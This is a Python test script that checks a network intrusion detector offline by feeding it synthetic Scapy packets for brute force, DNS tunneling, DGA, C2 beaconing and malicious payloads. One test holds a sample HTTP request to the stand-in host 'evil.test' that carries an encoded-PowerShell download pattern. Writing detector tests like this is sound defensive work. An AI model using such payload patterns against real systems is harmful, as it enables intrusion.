#!/usr/bin/env python3
"""
Offline verification for REVA malware / unauthorized-access detections.

Does NOT require NetWatch to be running or Administrator privileges.
Imports app.py detection functions and feeds synthetic Scapy packets.

Usage (from packet_sniffer folder):
    .venv\\Scripts\\python.exe scripts\\verify_reva_detections.py
    .venv\\Scripts\\python.exe scripts\\verify_reva_detections.py --pdf
"""

from __future__ import annotations

import argparse
import os
import sys
import time

# Allow importing app from parent directory
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from scapy.all import DNS, DNSQR, IP, Raw, TCP, UDP  # noqa: E402

import app  # noqa: E402


def reset_state() -> None:
    app.ALERT_COOLDOWN.clear()
    app.dns_query_tracker.clear()
    app.auth_port_tracker.clear()
    app.beacon_tracker.clear()
    app.alerts.clear()


def assert_alert(
    test_name: str,
    expected_type: str,
    expected_category: str | None = None,
    expected_severity: str | None = None,
) -> None:
    matches = [a for a in app.alerts if a.get("type") == expected_type]
    if not matches:
        raise AssertionError(f"{test_name}: no alert with type '{expected_type}'")
    alert = matches[0]
    if expected_category and alert.get("category") != expected_category:
        raise AssertionError(
            f"{test_name}: category expected '{expected_category}', got '{alert.get('category')}'"
        )
    if expected_severity and alert.get("severity") != expected_severity:
        raise AssertionError(
            f"{test_name}: severity expected '{expected_severity}', got '{alert.get('severity')}'"
        )
    print(f"  PASS  {test_name} -> {expected_type} [{alert.get('category')}]")


def test_brute_force() -> None:
    reset_state()
    src = "192.168.99.10"
    now = time.time()
    for i in range(16):
        pkt = IP(src=src, dst="192.168.1.1") / TCP(sport=41000 + i, dport=22, flags="S")
        app.check_brute_force(pkt, src, now + i * 0.05)
    assert_alert(
        "Brute force",
        "Brute Force Attempt",
        expected_category="Unauthorized Access",
        expected_severity="MEDIUM",
    )


def test_dns_tunnel() -> None:
    reset_state()
    src = "192.168.99.11"
    now = time.time()
    long_name = ("x" * 85) + ".tunnel.example"
    pkt = IP(src=src) / UDP(dport=53) / DNS(qd=DNSQR(qname=long_name.encode()))
    app.check_dns_anomalies(pkt, src, now)
    assert_alert(
        "DNS tunneling",
        "DNS Tunneling",
        expected_category="Malware Activity",
        expected_severity="MEDIUM",
    )


def test_dga_dns() -> None:
    reset_state()
    src = "192.168.99.12"
    now = time.time()
    for i in range(51):
        qname = f"{i:04d}random{i}.dga.test"
        pkt = IP(src=src) / UDP(dport=53) / DNS(qd=DNSQR(qname=qname.encode()))
        app.check_dns_anomalies(pkt, src, now + i * 0.01)
    assert_alert(
        "DGA DNS",
        "DGA DNS Activity",
        expected_category="Malware Activity",
        expected_severity="MEDIUM",
    )


def test_malware_payload() -> None:
    reset_state()
    src = "192.168.99.13"
    now = time.time()
    body = b"GET /download?run=POWERSHELL+-enc+AAAA HTTP/1.1\r\nHost: evil.test\r\n\r\n"
    pkt = IP(src=src) / TCP(dport=80) / Raw(load=body)
    app.check_malware_payloads(pkt, src, now)
    assert_alert(
        "Suspicious payload",
        "Suspicious Payload",
        expected_category="Malware Activity",
        expected_severity="HIGH",
    )


def test_c2_beacon() -> None:
    reset_state()
    src = "192.168.99.14"
    dst = "8.8.8.8"  # must not be private/reserved (203.0.113.x is reserved)
    now = time.time()
    for i in range(8):
        pkt = IP(src=src, dst=dst, len=100) / TCP(dport=443, sport=52000)
        app.check_c2_beacon(pkt, src, dst, now + i * 30)
    assert_alert(
        "C2 beacon",
        "C2 Beacon",
        expected_category="Malware Activity",
        expected_severity="HIGH",
    )


def test_emit_category() -> None:
    reset_state()
    app._emit_alert(
        {
            "time": "12:00:00",
            "type": "Port Scan",
            "severity": "MEDIUM",
            "src": "10.0.0.1",
            "detail": "category smoke test",
        }
    )
    assert_alert("Category auto-assign", "Port Scan", expected_category="Reconnaissance")


def test_mitre_map() -> None:
    required = [
        "DNS Tunneling",
        "DGA DNS Activity",
        "Brute Force Attempt",
        "C2 Beacon",
        "Suspicious Payload",
    ]
    missing = [t for t in required if t not in app.MITRE_MAP]
    if missing:
        raise AssertionError(f"MITRE_MAP missing entries: {missing}")
    print("  PASS  MITRE_MAP contains all REVA detection types")


def test_handle_start_clears_trackers() -> None:
    app.dns_query_tracker["x"] = [(time.time(), "a.example")]
    app.auth_port_tracker["x"] = [(time.time(), 22)]
    app.beacon_tracker[("x", "1.2.3.4", 443)] = [(time.time(), 100)]
    app.dns_query_tracker.clear()
    app.auth_port_tracker.clear()
    app.beacon_tracker.clear()
    if app.dns_query_tracker or app.auth_port_tracker or app.beacon_tracker:
        raise AssertionError("Tracker clear simulation failed")
    print("  PASS  Tracker reset pattern (manual: click Start Capture in UI)")


def test_pdf() -> str | None:
    reset_state()
    app._emit_alert(
        {
            "time": "12:01:00",
            "type": "Brute Force Attempt",
            "severity": "MEDIUM",
            "src": "192.168.99.10",
            "detail": "verify_reva_detections.py smoke test",
        }
    )
    path = app.generate_report()
    if not os.path.isfile(path):
        raise AssertionError(f"PDF not created: {path}")
    print(f"  PASS  Forensic PDF generated: {path}")
    return path


def main() -> int:
    parser = argparse.ArgumentParser(description="Verify REVA detection rules offline")
    parser.add_argument(
        "--pdf",
        action="store_true",
        help="Also generate a sample forensic PDF",
    )
    args = parser.parse_args()

    print("NetWatch REVA detection verification (offline)\n")
    tests = [
        test_brute_force,
        test_dns_tunnel,
        test_dga_dns,
        test_malware_payload,
        test_c2_beacon,
        test_emit_category,
        test_mitre_map,
        test_handle_start_clears_trackers,
    ]
    failed = 0
    for fn in tests:
        try:
            fn()
        except Exception as exc:
            failed += 1
            print(f"  FAIL  {fn.__name__}: {exc}")

    if args.pdf:
        try:
            test_pdf()
        except Exception as exc:
            failed += 1
            print(f"  FAIL  PDF: {exc}")

    print()
    if failed:
        print(f"Result: {failed} check(s) FAILED")
        return 1
    print("Result: all checks PASSED")
    print("\nNext: run live demo while NetWatch is capturing:")
    print("  .venv\\Scripts\\python.exe scripts\\demo_reva_traffic.py --help")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
